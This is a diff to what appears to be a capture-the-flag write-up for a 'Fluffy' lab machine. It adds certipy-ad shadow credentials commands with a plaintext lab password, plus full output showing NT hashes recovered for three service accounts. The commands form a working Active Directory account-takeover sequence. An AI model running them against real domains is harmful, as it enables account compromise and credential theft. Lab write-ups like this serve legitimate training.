@@ -454,17 +454,79 @@ bloodhound images
 Shadow credentials attack:
 
 ```
-certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.232.88 -dc-host DC01.fluffy.htb
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Targeting user 'winrm_svc'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '65d95e1e1ca241acb9fc4fdf01c26291'
-[*] Adding Key Credential with device ID '65d95e1e1ca241acb9fc4fdf01c26291' to the Key Credentials for 'winrm_svc'
-[-] Could not update Key Credentials for 'winrm_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+[*] Key Credential generated with DeviceID '8f05db9a26a243b0975a25f20dd8887b'
+[*] Adding Key Credential with device ID '8f05db9a26a243b0975a25f20dd8887b' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '8f05db9a26a243b0975a25f20dd8887b' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
 
+```
+
+```
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'ac3e1302e69b4132b91cbb26003d2909'
+[*] Adding Key Credential with device ID 'ac3e1302e69b4132b91cbb26003d2909' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'ac3e1302e69b4132b91cbb26003d2909' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+
+```
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ldap_svc -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ldap_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '02fdc805116e4aa58fec86151a5a8630'
+[*] Adding Key Credential with device ID '02fdc805116e4aa58fec86151a5a8630' to the Key Credentials for 'ldap_svc'
+[*] Successfully added Key Credential with device ID '02fdc805116e4aa58fec86151a5a8630' to the Key Credentials for 'ldap_svc'
+[*] Authenticating as 'ldap_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ldap_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ldap_svc.ccache'
+[*] Wrote credential cache to 'ldap_svc.ccache'
+[*] Trying to retrieve NT hash for 'ldap_svc'
+[*] Restoring the old Key Credentials for 'ldap_svc'
+[*] Successfully restored the old Key Credentials for 'ldap_svc'
+[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
 ```
 
 ---
